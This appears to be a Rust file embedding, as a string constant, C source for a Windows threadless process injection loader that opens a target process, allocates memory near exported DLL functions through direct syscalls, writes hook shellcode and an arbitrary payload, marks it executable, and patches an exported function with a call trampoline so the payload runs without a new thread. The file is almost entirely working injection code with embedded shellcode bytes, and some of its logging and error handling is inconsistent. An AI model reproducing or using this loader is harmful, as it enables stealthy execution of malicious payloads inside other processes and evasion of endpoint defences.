pub const KANNTHREADLESSINJ_C: &str = r#"

#include <stdio.h>
#include <windows.h>

#include "../include/KannThreadlessCommonInj.h"
#include "../include/Process.h"

unsigned char g_HookShellcode[63] = {
    0x5b, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
    0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
    0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
    0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3};


/* FindMemoryHole
 *
 * hProcess: Target Process
 * puAddress: A pointer to a ULONG_PTR variable that will receive the base
 * address of allocated memory hole. uExportedFuncAddress: The address of an
 * exported function in the target process.(will hooked)
 */
BOOL FindMemoryHole(HANDLE hProcess, ULONG_PTR *puAddress,
                    ULONG_PTR uExportedFuncAddress, SIZE_T sPayloadSize,
                    PNTAPI_FUNC g_Nt) {
    NTSTATUS STATUS;
    ULONG_PTR uAddress = 0;
    SIZE_T sTmpSizeVar = sPayloadSize;

    for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
         uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) {
        SET_SYSCALL(g_Nt->NtAllocateVirtualMemory);
        if ((STATUS = RunSyscall(hProcess, &uAddress, 0, &sTmpSizeVar,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) !=
            0x00)
            continue;
        *puAddress = uAddress;
        break;
    }
}

BOOL WritePayloadBuffer(HANDLE hProcess, ULONG_PTR uAddress,
                        ULONG_PTR uHookShellcode, SIZE_T sHookShellcodeSize,
                        ULONG_PTR uPayloadBuffer, SIZE_T sPayloadSize,
                        PNTAPI_FUNC g_Nt, PULONG_PTR puPayloadBuffer,
                        SIZE_T *psPayloadSize) {
    SIZE_T sTmpSizeVar = sPayloadSize, sMainPayloadByteWritten = 0x00,
           sHookShellcodeByteWritten = 0x00;
    DWORD dwOldProtection = 0x00;
    NTSTATUS STATUS = 0;

    // write g_HookShellcode
    SET_SYSCALL(g_Nt->NtWriteVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, uAddress, uHookShellcode,
                             sHookShellcodeSize, &sHookShellcodeByteWritten)) !=
        0x00)
        return FALSE;

    printf("[+] Write g_HookShellcode to %p\n", uAddress);
    printf("[+] Write g_HookShellcode size: %d\n", sHookShellcodeByteWritten);

    // write main payload after g_HookShellcode

    SET_SYSCALL(g_Nt->NtWriteVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, (uAddress + sHookShellcodeByteWritten),
                             uPayloadBuffer, sPayloadSize,
                             &sMainPayloadByteWritten)) != 0x00)
        return FALSE;

    printf("[+] Write PayloadBuffer to %p\n", uAddress + sMainPayloadByteWritten);
    printf("[+] Write PayloadBuffer size: %d\n", sMainPayloadByteWritten);

    SIZE_T sAllocatedSize = sMainPayloadByteWritten + sHookShellcodeByteWritten;

    *psPayloadSize = sAllocatedSize;
    *puPayloadBuffer = uAddress;
    printf("[+] psPayloadSize: %d\n", *psPayloadSize);
    printf("[+] puPayloadBuffer: %p\n", *puPayloadBuffer);
    // now we need to change the memory protection of the allocated memory
    SET_SYSCALL(g_Nt->NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &uAddress, &sAllocatedSize,
                             PAGE_EXECUTE_READWRITE, &dwOldProtection)) != 0x00)
        return FALSE;
    printf("[+] Change memory protection to PAGE_READWRITE\n");

    return TRUE;
}
/*
 * PatchAndInstallTrampoline
 *
 * The function will install Kann Shellcode begining of the Exported function
 *
 *
 */
BOOL PatchAndInstallTrampoline(HANDLE hProcess, PVOID pAddressOfExportedFunc,
                               PVOID pMainPayloadAddress, PNTAPI_FUNC g_Nt) {
    NTSTATUS STATUS = 0x00;
    DWORD dwOldProtection = 0x00;
    unsigned char uTrampoline[0x05] = {0xE8, 0x00, 0x00, 0x00, 0x00};
    unsigned long ullRVA = (unsigned long)((ULONG_PTR)pMainPayloadAddress -
                                           ((ULONG_PTR)pAddressOfExportedFunc +
                                            sizeof(uTrampoline)));  // The RVA
    SIZE_T sTmpSizeVar = sizeof(uTrampoline), sByteWritten = 0x00;
    PVOID pTmpAddress = pAddressOfExportedFunc;

    memcpy(&uTrampoline[0x01], &ullRVA, sizeof(ullRVA));
    SET_SYSCALL(g_Nt->NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pTmpAddress, &sTmpSizeVar,
                             PAGE_READWRITE, &dwOldProtection)) != 0x00)
        return FALSE;
    printf("[+] Enable write access to the Exported function Done!\n");

    SET_SYSCALL(g_Nt->NtWriteVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, pAddressOfExportedFunc, &uTrampoline,
                             sizeof(uTrampoline), &sByteWritten)) != 0x00)
        return FALSE;
    printf("[+] Write Trampoline to Exported function Done!\n");

    sTmpSizeVar = sizeof(uTrampoline);
    pTmpAddress = pAddressOfExportedFunc;

    SET_SYSCALL(g_Nt->NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pTmpAddress, &sTmpSizeVar,
                             PAGE_EXECUTE_READWRITE, &dwOldProtection)) != 0x00)
        return FALSE;

    printf("[+] Change memory protection to PAGE_EXECUTE_READ\n");
    return TRUE;
}

VOID PatchHookShellcode(IN PVOID pAddressOfExportedFunc) {
    unsigned long long ullOriginalBytes =
        *(unsigned long long *)pAddressOfExportedFunc;

    printf("[ALLIN] ullOriginalBytes : %p\n", ullOriginalBytes);
    printf("[ALLIN] ullOriginalBytes : %p\n", &ullOriginalBytes);
    memcpy(&g_HookShellcode[22], &ullOriginalBytes, sizeof(ullOriginalBytes));

}
LAUNCHER_STATUS KannThreadlessCommonInj(PVOID pBuffer, DWORD sBufferSize,
                                        PBYTE pCustomPayload,
                                        SIZE_T sCustomPayloadSize,
                                        PNTAPI_FUNC g_Nt) {
    ULONG_PTR uAddress = 0x00, uAddressTwo = 0x0;
    PVOID pExportedFuncAddress = 0x00, pExportedFuncAddressTwo = 0x00,
          pAddress = 0x00, pExportedFuncAddressBackup = 0x00,
          pExportedFuncAddressTwoBackup = 0x00;
    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0x00;
    SIZE_T ssBufferSize = 0x00, sByteWritten = 0x00, sTmpSizeVar = 0x00;
    ;
    NTSTATUS STATUS = 0x00;
    DWORD dwOldProtection = 0x00;
    // Enumerate process by name
    EnumProcessByName(TEXT(TARGET_PROCESS), &dwProcessId);
    if (dwProcessId == 0x00) {
        printf("[-] Can't find the target process\n");
        return LAUNCHER_STATUS_FAILED;
    }
    printf("[+] Found the target process: %d\n", dwProcessId);
    // open process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

    if ((pExportedFuncAddress = GetProcAddress(LoadLibrary(TEXT(TARGET_DLL)),
                                               TARGET_FUNC)) == NULL) {
        printf("[-] Can't find the target function\n");
        return LAUNCHER_STATUS_FAILED;
    }

    if ((pExportedFuncAddressTwo = GetProcAddress(LoadLibrary(TEXT(TARGET_DLL)),
                                                  TARGET_FUNC_TWO)) == NULL) {
        printf("[-] Can't find the target function\n");
        return LAUNCHER_STATUS_FAILED;
    }

    PatchHookShellcode(pExportedFuncAddress);
    printf("[*] !%s.%s : 0x%p \n", TARGET_DLL, TARGET_FUNC, pExportedFuncAddress);
    printf("[*] !%s.%s : 0x%p \n", TARGET_DLL, TARGET_FUNC_TWO, pExportedFuncAddressTwo);

    pExportedFuncAddressBackup = pExportedFuncAddress;
    pExportedFuncAddressTwoBackup = pExportedFuncAddressTwo;
    if (FindMemoryHole(hProcess, &uAddress, (ULONG_PTR)pExportedFuncAddress,
                       sCustomPayloadSize + sizeof(g_HookShellcode),
                       g_Nt) == FALSE) {
        printf("[-] Can't find the memory hole\n");
        return LAUNCHER_STATUS_FAILED;
    }
    printf("[+] Found the memory hole: %p For Kann Shellcode and save Shellcode\n",(void *)uAddress);

    printf("[+] Now we need find memory hole with Size : %d For Main Payload\n", sBufferSize);
    if (FindMemoryHole(hProcess, &uAddressTwo,
                       (ULONG_PTR)pExportedFuncAddressTwo, sBufferSize,
                       g_Nt) == FALSE) {
        printf("[-] Can't find the memory hole\n");
        return LAUNCHER_STATUS_FAILED;
    }
    printf("[+] Found the memory hole: %p For Main Payload\n", (void *)uAddressTwo);

    // now we need write xored main payload in uAddressTwo
    printf("[INFO] Now we need write xored main payload in uAddressTwo\n");
    SIZE_T tempSize = sBufferSize;
    ULONG_PTR uAddressTwoBackup = uAddressTwo;
    printf("[DEBUG] uAddressTwo : %p\n", uAddressTwo);
    printf("[DBUEG] tempSize: %d\n", tempSize);
    SET_SYSCALL(g_Nt->NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &uAddressTwo, &tempSize,
                             PAGE_EXECUTE_READWRITE, &dwOldProtection)) != 0x00)
        return FALSE;
    printf("[+] For Main Shellcode Enable write access to the Exported function Done!\n");

    printf("[DEBUG] uAddressTwo : %p\n", uAddressTwo);
    printf("[DBUEG] tempSize: %d\n", tempSize);
    SET_SYSCALL(g_Nt->NtWriteVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, uAddressTwoBackup, pBuffer, sBufferSize,
                             &sByteWritten)) != 0x00)
        return FALSE;

    printf("[+] Main Payload Written at %p\n", uAddressTwoBackup);
    printf("[INFO] Now we need Patch Kann Shellcode\n");

    pAddress = (PVOID)uAddressTwo;
    ssBufferSize = sBufferSize;
    printf("[*] Payload buffer address: %p\n", pAddress);
    printf("[*] Payload buffer size: %d\n", ssBufferSize);



    printf("\t(i) Start Patch CustomShellCode (ProtectDecryptAddress)...\n");
    int eggIndex = 0;
    for (int i = 0; i < sCustomPayloadSize; i++) {
        if (pCustomPayload[i] == 0x88 && pCustomPayload[i + 1] == 0x88 &&
            pCustomPayload[i + 2] == 0x88 && pCustomPayload[i + 3] == 0x88 &&
            pCustomPayload[i + 4] == 0x88 && pCustomPayload[i + 5] == 0x88 &&
            pCustomPayload[i + 6] == 0x88 && pCustomPayload[i + 7] == 0x88) {
            printf("\t(i) Detect Bad Char (ProtectDecryptAddress)\n");
            eggIndex = i;
            break;
        }
    };
    memcpy((void *)&pCustomPayload[eggIndex], &pAddress, 8);

    printf("\t(i) Start Patch CustomShellCode (JumpAddress)...\n");
    eggIndex = 0;
    for (int i = 0; i < sCustomPayloadSize; i++) {
        if (pCustomPayload[i] == 0x49 && pCustomPayload[i + 1] == 0xBA &&
            pCustomPayload[i + 2] == 0x00 && pCustomPayload[i + 3] == 0x00 &&
            pCustomPayload[i + 4] == 0x00 && pCustomPayload[i + 5] == 0x00 &&
            pCustomPayload[i + 6] == 0x00 && pCustomPayload[i + 7] == 0x00 &&
            pCustomPayload[i + 8] == 0x00 && pCustomPayload[i + 9] == 0x00 &&
            pCustomPayload[i + 10] == 0x41 && pCustomPayload[i + 11] == 0xFF &&
            pCustomPayload[i + 12] == 0xE2) {
            printf("\t(i) Detect Bad Char (JumpAddress)\n");
            eggIndex = i + 2;
            break;
        }
    };
    memcpy((void *)&pCustomPayload[eggIndex], &pAddress, 8);

    printf("\t(i) Start Patch CustomShellCode (Length)...\n");
    eggIndex = 0;
    for (int i = 0; i < sCustomPayloadSize; i++) {
        if (pCustomPayload[i] == 0xDE && pCustomPayload[i + 1] == 0xAD &&
            pCustomPayload[i + 2] == 0x10 && pCustomPayload[i + 3] == 0xAF) {
            printf("\t(i) Detect Bad Char (Length)\n");
            eggIndex = i;
            break;
        }
    };

    memcpy((void *)&pCustomPayload[eggIndex], (void *)&ssBufferSize, 8);

    if (WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_HookShellcode,
                           sizeof(g_HookShellcode), (ULONG_PTR)pCustomPayload,
                           sCustomPayloadSize, g_Nt, &uAddress,
                           &sTmpSizeVar) == FALSE) {
        printf("[-] Can't write the payload buffer\n");
        return LAUNCHER_STATUS_FAILED;
    }

    printf("[INFO] New we need path hook shellcode and install\n");
    printf("[DEBUG] uAddress: %p\n", uAddress);
    printf("[DEBUG] pExportedFuncAddress: %p\n", pExportedFuncAddress);
    if (PatchAndInstallTrampoline(hProcess, pExportedFuncAddress,
                                  (PVOID)uAddress, g_Nt) == FALSE) {
        printf("[-] Can't patch and install trampoline\n");
        return LAUNCHER_STATUS_FAILED;
    }

    printf("[+] Installed %s Hook! \n", TARGET_FUNC);
    return LAUNCHER_STATUS_SUCCESS;
}"#;
